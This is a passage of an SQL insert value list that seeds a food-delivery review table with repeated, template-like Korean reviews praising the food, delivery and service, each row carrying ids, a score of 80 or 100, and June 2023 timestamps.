	(1006, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 15, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1007, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1008, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 13, 20, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1009, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 12, 22, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1010, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 12, 21, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1011, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1012, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 19, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1013, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 13, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1014, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 10, 20, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1015, '음식의 맛과 양 모두 만족스러웠습니다.', 15, 22, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1016, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 19, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1017, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 12, 21, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1018, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1019, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 20, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1020, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 21, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1021, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 19, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1022, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 12, 19, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1023, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 22, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1024, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 10, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1025, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 21, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1026, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 21, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1027, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 21, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1028, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 19, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1029, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 19, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1030, '서비스 태도도 좋았고, 음식도 맛있었어요.', 15, 21, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1031, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 20, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1032, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 13, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1033, '음식의 맛과 양 모두 만족스러웠습니다.', 12, 21, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1034, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 10, 19, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1035, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 21, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1036, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 20, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1037, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 13, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1038, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 15, 20, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1039, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 10, 22, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1040, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 10, 19, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1041, '음식의 맛과 가격이 모두 만족스러웠습니다.', 13, 20, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1042, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 11, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1043, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 14, 19, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1044, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 14, 20, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1045, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 11, 22, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1046, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 13, 22, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1047, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 14, 22, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1048, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 21, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1049, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 21, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1050, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 14, 20, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1051, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 20, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1052, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 22, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1053, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 11, 21, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1054, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 10, 19, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1055, '음식의 맛과 양 모두 만족스러웠습니다.', 11, 20, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1056, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 11, 19, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1057, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 14, 19, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1058, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 20, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1059, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 20, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1060, '서비스 태도도 좋았고, 음식도 맛있었어요.', 14, 22, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1061, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 15, 22, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1062, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 22, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1063, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 22, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1064, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 10, 21, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1065, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 12, 19, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1066, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 12, 20, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1067, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 13, 19, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1068, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 11, 21, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1069, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 11, 20, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1070, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 22, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1071, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 11, 19, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1072, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 20, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1073, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 11, 21, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1074, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 13, 22, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1075, '음식의 맛과 가격이 모두 만족스러웠습니다.', 14, 19, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1076, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 13, 21, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1077, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 11, 22, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1078, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 20, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1079, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 15, 20, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1080, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 13, 21, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1081, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 22, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1082, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 11, 21, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1083, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 15, 19, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1084, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 19, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1085, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 22, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1086, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 19, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1087, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 14, 19, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1088, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 22, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1089, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 12, 21, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1090, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 10, 21, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1091, '음식의 맛과 양 모두 만족스러웠습니다.', 15, 20, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1092, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 19, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1093, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 20, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1094, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 20, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1095, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 20, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1096, '음식의 맛과 양 모두 만족스러웠습니다.', 11, 22, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1097, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 11, 20, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1098, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 21, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1099, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 12, 19, 80, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1100, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 11, 21, 100, '2023-06-05 23:24:27', '2023-06-05 23:24:27', NULL),
	(1101, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1102, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 11, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1103, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1104, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 13, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1105, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1106, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1107, '서비스 태도도 좋았고, 음식도 맛있었어요.', 14, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1108, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 13, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1109, '음식의 맛과 가격이 모두 만족스러웠습니다.', 11, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1110, '음식의 맛과 가격이 모두 만족스러웠습니다.', 13, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1111, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 13, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1112, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 11, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1113, '음식의 맛과 양 모두 만족스러웠습니다.', 14, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1114, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 14, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1115, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 11, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1116, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 13, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1117, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 13, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1118, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1119, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1120, '음식의 맛과 가격이 모두 만족스러웠습니다.', 12, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1121, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1122, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1123, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1124, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 13, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1125, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 13, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1126, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 10, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1127, '음식의 맛과 가격이 모두 만족스러웠습니다.', 11, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1128, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 13, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1129, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 13, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1130, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 12, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1131, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1132, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 11, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1133, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1134, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 10, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1135, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1136, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1137, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1138, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1139, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1140, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 20, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1141, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1142, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 20, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1143, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 11, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1144, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 13, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1145, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 14, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1146, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 12, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1147, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 12, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1148, '음식의 맛과 양 모두 만족스러웠습니다.', 11, 20, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1149, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 13, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1150, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 12, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1151, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 10, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1152, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1153, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 10, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1154, '음식의 맛과 가격이 모두 만족스러웠습니다.', 14, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1155, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 11, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1156, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1157, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1158, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 14, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1159, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1160, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 14, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1161, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 12, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1162, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 20, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1163, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 13, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1164, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1165, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1166, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 20, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1167, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 11, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1168, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 13, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1169, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 14, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1170, '음식의 맛과 가격이 모두 만족스러웠습니다.', 12, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1171, '서비스 태도도 좋았고, 음식도 맛있었어요.', 13, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1172, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 14, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1173, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
